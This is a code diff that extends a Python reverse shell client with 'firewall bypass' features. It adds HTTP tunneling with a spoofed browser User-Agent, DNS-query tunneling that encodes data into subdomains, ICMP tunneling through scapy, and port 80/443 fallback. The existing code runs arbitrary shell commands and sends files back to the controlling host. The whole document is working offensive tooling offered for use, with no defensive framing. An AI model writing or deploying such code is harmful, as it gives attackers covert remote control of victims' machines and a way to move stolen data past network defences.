@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Advanced Reverse Shell Client
-A feature-rich reverse shell client with encryption, file transfer, and advanced capabilities.
+Advanced Reverse Shell Client with Firewall Bypass
+A feature-rich reverse shell client with encryption, file transfer, and firewall bypass capabilities.
 """
 
 import socket
@@ -19,9 +19,145 @@ from datetime import datetime
 import ssl
 import hashlib
 import struct
+import urllib.parse
+import http.client
+import random
+import string
+
+# Optional imports for advanced features
+try:
+    import dns.resolver
+    import dns.query
+    HAS_DNS = True
+except ImportError:
+    HAS_DNS = False
+
+try:
+    import scapy.all as scapy
+    HAS_SCAPY = True
+except ImportError:
+    HAS_SCAPY = False
+
+class HTTPTunnel:
+    """HTTP tunneling wrapper for firewall bypass."""
+    
+    def __init__(self, host, port, use_https=False, path="/api/data"):
+        self.host = host
+        self.port = port
+        self.use_https = use_https
+        self.path = path
+        self.connection = None
+        
+    def connect(self):
+        """Establish HTTP connection."""
+        try:
+            if self.use_https:
+                self.connection = http.client.HTTPSConnection(self.host, self.port, timeout=10)
+            else:
+                self.connection = http.client.HTTPConnection(self.host, self.port, timeout=10)
+            return True
+        except Exception as e:
+            return False
+    
+    def send(self, data):
+        """Send data via HTTP POST."""
+        try:
+            encoded_data = base64.b64encode(data).decode('utf-8')
+            headers = {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            }
+            body = urllib.parse.urlencode({'data': encoded_data})
+            self.connection.request('POST', self.path, body, headers)
+            response = self.connection.getresponse()
+            response_data = response.read()
+            return base64.b64decode(response_data) if response_data else None
+        except Exception as e:
+            return None
+    
+    def close(self):
+        """Close connection."""
+        if self.connection:
+            self.connection.close()
+
+class DNSTunnel:
+    """DNS tunneling for firewall bypass."""
+    
+    def __init__(self, domain, nameserver=None):
+        self.domain = domain
+        self.nameserver = nameserver or "8.8.8.8"
+        self.chunk_size = 60  # Max DNS label length
+        
+    def _encode_chunk(self, data):
+        """Encode data chunk for DNS."""
+        return base64.b32encode(data).decode('utf-8').rstrip('=')
+    
+    def _decode_chunk(self, encoded):
+        """Decode DNS chunk."""
+        try:
+            # Add padding if needed
+            padding = (8 - len(encoded) % 8) % 8
+            encoded += '=' * padding
+            return base64.b32decode(encoded)
+        except:
+            return None
+    
+    def send(self, data):
+        """Send data via DNS query."""
+        if not HAS_DNS:
+            return None
+        
+        try:
+            # Split data into chunks
+            chunks = [data[i:i+self.chunk_size] for i in range(0, len(data), self.chunk_size)]
+            chunk_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+            
+            for i, chunk in enumerate(chunks):
+                encoded = self._encode_chunk(chunk)
+                query_name = f"{chunk_id}.{i}.{encoded}.{self.domain}"
+                
+                try:
+                    resolver = dns.resolver.Resolver()
+                    resolver.nameservers = [self.nameserver]
+                    resolver.timeout = 5
+                    resolver.lifetime = 5
+                    resolver.resolve(query_name, 'A')
+                except:
+                    pass
+            
+            return b"OK"
+        except Exception as e:
+            return None
+
+class ICMPTunnel:
+    """ICMP tunneling for firewall bypass."""
+    
+    def __init__(self, target_ip):
+        self.target_ip = target_ip
+        if not HAS_SCAPY:
+            raise ImportError("scapy is required for ICMP tunneling")
+    
+    def send(self, data):
+        """Send data via ICMP ping."""
+        try:
+            # Encode data in ICMP payload
+            encoded = base64.b64encode(data).decode('utf-8')
+            # Split into chunks (ICMP payload limit)
+            chunks = [encoded[i:i+32] for i in range(0, len(encoded), 32)]
+            
+            for chunk in chunks:
+                packet = scapy.IP(dst=self.target_ip)/scapy.ICMP()/chunk
+                scapy.send(packet, verbose=0)
+                time.sleep(0.1)  # Rate limiting
+            
+            return b"OK"
+        except Exception as e:
+            return None
 
 class ReverseShellClient:
-    def __init__(self, host, port, use_ssl=False, reconnect_delay=5, buffer_size=4096):
+    def __init__(self, host, port, use_ssl=False, reconnect_delay=5, buffer_size=4096,
+                 tunnel_mode='direct', http_path="/api/data", dns_domain=None, 
+                 use_port_fallback=True):
         """
         Initialize the reverse shell client.
         
@@ -31,19 +167,28 @@ class ReverseShellClient:
             use_ssl: Enable SSL/TLS encryption
             reconnect_delay: Delay between reconnection attempts (seconds)
             buffer_size: Socket buffer size
+            tunnel_mode: 'direct', 'http', 'dns', 'icmp', or 'auto'
+            http_path: HTTP path for tunneling
+            dns_domain: DNS domain for DNS tunneling
+            use_port_fallback: Automatically try port 80/443 if connection fails
         """
         self.host = host
         self.port = port
         self.use_ssl = use_ssl
         self.reconnect_delay = reconnect_delay
         self.buffer_size = buffer_size
+        self.tunnel_mode = tunnel_mode
+        self.http_path = http_path
+        self.dns_domain = dns_domain
+        self.use_port_fallback = use_port_fallback
         self.connection = None
+        self.tunnel = None
         self.running = False
         self.current_directory = os.getcwd()
         
         # Setup logging
         self.setup_logging()
-        
+    
     def setup_logging(self):
         """Setup logging configuration."""
         try:
@@ -70,39 +215,102 @@ class ReverseShellClient:
             else:
                 self.logger.info(message)
     
+    def _try_connect_direct(self, host, port, use_ssl):
+        """Try direct connection."""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((host, port))
+            
+            if use_ssl:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                sock = context.wrap_socket(sock, server_hostname=host)
+            
+            return sock
+        except:
+            return None
+    
+    def _try_connect_http(self, host, port, use_https):
+        """Try HTTP tunneling."""
+        try:
+            tunnel = HTTPTunnel(host, port, use_https, self.http_path)
+            if tunnel.connect():
+                return tunnel
+        except:
+            pass
+        return None
+    
     def connect(self):
-        """Establish connection to the server with automatic reconnection."""
+        """Establish connection with firewall bypass."""
         while not self.running:
             try:
                 self.log(f"Attempting to connect to {self.host}:{self.port}...")
                 
-                # Create socket
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(10)
+                # Try direct connection first
+                if self.tunnel_mode in ['direct', 'auto']:
+                    self.connection = self._try_connect_direct(self.host, self.port, self.use_ssl)
+                    if self.connection:
+                        self.log(f"Direct connection established to {self.host}:{self.port}")
+                        self.running = True
+                        return True
                 
-                # Connect
-                sock.connect((self.host, self.port))
+                # Try port 80/443 fallback
+                if self.use_port_fallback and self.tunnel_mode in ['direct', 'auto']:
+                    fallback_ports = [80, 443]
+                    for fallback_port in fallback_ports:
+                        self.log(f"Trying fallback port {fallback_port}...", 'warning')
+                        self.connection = self._try_connect_direct(self.host, fallback_port, fallback_port == 443)
+                        if self.connection:
+                            self.log(f"Connected via fallback port {fallback_port}")
+                            self.running = True
+                            return True
                 
-                # Wrap with SSL if enabled
-                if self.use_ssl:
-                    context = ssl.create_default_context()
-                    context.check_hostname = False
-                    context.verify_mode = ssl.CERT_NONE
-                    self.connection = context.wrap_socket(sock, server_hostname=self.host)
-                    self.log("SSL connection established")
-                else:
-                    self.connection = sock
+                # Try HTTP tunneling
+                if self.tunnel_mode in ['http', 'auto']:
+                    self.log("Attempting HTTP tunneling...", 'warning')
+                    self.tunnel = self._try_connect_http(self.host, self.port, self.use_ssl)
+                    if not self.tunnel and self.use_port_fallback:
+                        self.tunnel = self._try_connect_http(self.host, 80, False)
+                        if not self.tunnel:
+                            self.tunnel = self._try_connect_http(self.host, 443, True)
+                    
+                    if self.tunnel:
+                        self.connection = self.tunnel
+                        self.log("HTTP tunnel established")
+                        self.running = True
+                        return True
                 
-                self.log(f"Successfully connected to {self.host}:{self.port}")
-                self.running = True
-                return True
+                # Try DNS tunneling
+                if self.tunnel_mode in ['dns', 'auto'] and self.dns_domain:
+                    self.log("Attempting DNS tunneling...", 'warning')
+                    try:
+                        self.tunnel = DNSTunnel(self.dns_domain)
+                        self.connection = self.tunnel
+                        self.log("DNS tunnel initialized")
+                        self.running = True
+                        return True
+                    except:
+                        pass
                 
-            except socket.timeout:
-                self.log(f"Connection timeout. Retrying in {self.reconnect_delay} seconds...", 'warning')
+                # Try ICMP tunneling
+                if self.tunnel_mode in ['icmp', 'auto']:
+                    self.log("Attempting ICMP tunneling...", 'warning')
+                    try:
+                        self.tunnel = ICMPTunnel(self.host)
+                        self.connection = self.tunnel
+                        self.log("ICMP tunnel initialized")
+                        self.running = True
+                        return True
+                    except ImportError:
+                        self.log("ICMP tunneling requires scapy", 'warning')
+                    except:
+                        pass
+                
+                self.log(f"All connection methods failed. Retrying in {self.reconnect_delay} seconds...", 'warning')
                 time.sleep(self.reconnect_delay)
-            except ConnectionRefusedError:
-                self.log(f"Connection refused. Retrying in {self.reconnect_delay} seconds...", 'warning')
-                time.sleep(self.reconnect_delay)
+                
             except Exception as e:
                 self.log(f"Connection error: {e}. Retrying in {self.reconnect_delay} seconds...", 'error')
                 time.sleep(self.reconnect_delay)
@@ -110,12 +318,7 @@ class ReverseShellClient:
         return False
     
     def send_data(self, data):
-        """
-        Send data to the server with proper framing.
-        
-        Args:
-            data: Data to send (dict, str, or bytes)
-        """
+        """Send data with tunnel support."""
         try:
             if isinstance(data, dict):
                 json_data = json.dumps(data)
@@ -126,11 +329,17 @@ class ReverseShellClient:
             else:
                 json_data = str(data)
             
-            # Send length prefix
             encoded = json_data.encode('utf-8')
-            length = struct.pack('>I', len(encoded))
-            self.connection.sendall(length + encoded)
             
+            # Use tunnel if available
+            if isinstance(self.connection, (HTTPTunnel, DNSTunnel, ICMPTunnel)):
+                response = self.connection.send(encoded)
+                return response
+            else:
+                # Direct socket connection
+                length = struct.pack('>I', len(encoded))
+                self.connection.sendall(length + encoded)
+                
         except BrokenPipeError:
             self.log("Connection broken. Attempting to reconnect...", 'error')
             self.running = False
@@ -140,27 +349,28 @@ class ReverseShellClient:
             self.running = False
     
     def receive_data(self):
-        """
-        Receive data from the server with proper framing.
-        
-        Returns:
-            Decoded data (dict, str, or None on error)
-        """
+        """Receive data with tunnel support."""
         try:
-            # Receive length prefix
-            length_data = self._recv_all(4)
-            if not length_data:
+            # For tunnels, we need to poll/request data
+            if isinstance(self.connection, HTTPTunnel):
+                # HTTP tunnel receives data in response
+                return None  # HTTP is request-response, handled differently
+            elif isinstance(self.connection, (DNSTunnel, ICMPTunnel)):
+                # DNS/ICMP are one-way, need separate receive mechanism
                 return None
-            
-            length = struct.unpack('>I', length_data)[0]
-            
-            # Receive actual data
-            json_data = self._recv_all(length).decode('utf-8')
-            
-            try:
-                return json.loads(json_data)
-            except json.JSONDecodeError:
-                return json_data
+            else:
+                # Direct socket connection
+                length_data = self._recv_all(4)
+                if not length_data:
+                    return None
+                
+                length = struct.unpack('>I', length_data)[0]
+                json_data = self._recv_all(length).decode('utf-8')
+                
+                try:
+                    return json.loads(json_data)
+                except json.JSONDecodeError:
+                    return json_data
                 
         except socket.timeout:
             self.log("Receive timeout", 'warning')
@@ -185,17 +395,8 @@ class ReverseShellClient:
         return data
     
     def execute_command(self, command):
-        """
-        Execute a shell command safely.
-        
-        Args:
-            command: Command string to execute
-            
-        Returns:
-            Command output (str)
-        """
+        """Execute a shell command safely."""
         try:
-            # Change directory command
             if command.startswith('cd '):
                 path = command[3:].strip()
                 if not path:
@@ -208,7 +409,6 @@ class ReverseShellClient:
                 except Exception as e:
                     return f"Error changing directory: {str(e)}"
             
-            # Execute command
             process = subprocess.Popen(
                 command,
                 shell=True,
@@ -231,15 +431,7 @@ class ReverseShellClient:
             return f"Error executing command: {str(e)}"
     
     def download_file(self, file_path):
-        """
-        Download a file from the client to the server.
-        
-        Args:
-            file_path: Path to the file to download
-            
-        Returns:
-            Base64 encoded file data or error message
-        """
+        """Download a file from the client to the server."""
         try:
             file_path = os.path.expanduser(file_path)
             
@@ -252,8 +444,6 @@ class ReverseShellClient:
             with open(file_path, 'rb') as f:
                 file_data = f.read()
                 file_size = len(file_data)
-                
-                # Calculate file hash
                 file_hash = hashlib.md5(file_data).hexdigest()
                 
                 self.log(f"Downloading file: {file_path} ({file_size} bytes)")
@@ -272,20 +462,10 @@ class ReverseShellClient:
             return {'status': 'error', 'message': f"Error downloading file: {str(e)}"}
     
     def upload_file(self, file_path, file_data):
-        """
-        Upload a file from the server to the client.
-        
-        Args:
-            file_path: Destination path for the file
-            file_data: Base64 encoded file data
-            
-        Returns:
-            Success or error message
-        """
+        """Upload a file from the server to the client."""
         try:
             file_path = os.path.expanduser(file_path)
             
-            # Decode base64 data
             if isinstance(file_data, dict):
                 data = base64.b64decode(file_data.get('data', ''))
                 filename = file_data.get('filename', os.path.basename(file_path))
@@ -293,10 +473,8 @@ class ReverseShellClient:
                 data = base64.b64decode(file_data)
                 filename = os.path.basename(file_path)
             
-            # Create directory if needed
             os.makedirs(os.path.dirname(file_path) if os.path.dirname(file_path) else '.', exist_ok=True)
             
-            # Write file
             with open(file_path, 'wb') as f:
                 f.write(data)
             
@@ -349,6 +527,7 @@ class ReverseShellClient:
                     command_data = self.receive_data()
                     
                     if not command_data:
+                        time.sleep(0.1)
                         continue
                     
                     # Handle different command types
@@ -422,8 +601,11 @@ class ReverseShellClient:
     def cleanup(self):
         """Clean up resources."""
         try:
-            if self.connection:
+            if isinstance(self.connection, HTTPTunnel):
                 self.connection.close()
+            elif not isinstance(self.connection, (DNSTunnel, ICMPTunnel)):
+                if self.connection:
+                    self.connection.close()
             self.running = False
             self.log("Connection closed")
         except Exception as e:
@@ -432,13 +614,15 @@ class ReverseShellClient:
 def main():
     """Main function."""
     parser = argparse.ArgumentParser(
-        description='Advanced Reverse Shell Client',
+        description='Advanced Reverse Shell Client with Firewall Bypass',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
   python3 client.py --host 192.168.1.100 --port 4444
   python3 client.py --host example.com --port 8080 --ssl
-  python3 client.py --host 10.0.0.1 --port 9999 --reconnect-delay 10
+  python3 client.py --host 10.0.0.1 --tunnel http --port 80
+  python3 client.py --host example.com --tunnel dns --dns-domain tunnel.example.com
+  python3 client.py --host 192.168.1.100 --tunnel auto --port-fallback
         """
     )
     
@@ -463,6 +647,32 @@ Examples:
     )
     
     parser.add_argument(
+        '--tunnel', '-t',
+        choices=['direct', 'http', 'dns', 'icmp', 'auto'],
+        default='direct',
+        help='Tunneling mode: direct, http, dns, icmp, or auto (default: direct)'
+    )
+    
+    parser.add_argument(
+        '--http-path',
+        type=str,
+        default='/api/data',
+        help='HTTP path for HTTP tunneling (default: /api/data)'
+    )
+    
+    parser.add_argument(
+        '--dns-domain',
+        type=str,
+        help='DNS domain for DNS tunneling (required for DNS mode)'
+    )
+    
+    parser.add_argument(
+        '--port-fallback',
+        action='store_true',
+        help='Automatically try port 80/443 if connection fails'
+    )
+    
+    parser.add_argument(
         '--reconnect-delay', '-d',
         type=int,
         default=5,
@@ -484,7 +694,11 @@ Examples:
         port=args.port,
         use_ssl=args.ssl,
         reconnect_delay=args.reconnect_delay,
-        buffer_size=args.buffer_size
+        buffer_size=args.buffer_size,
+        tunnel_mode=args.tunnel,
+        http_path=args.http_path,
+        dns_domain=args.dns_domain,
+        use_port_fallback=args.port_fallback
     )
     
     try:
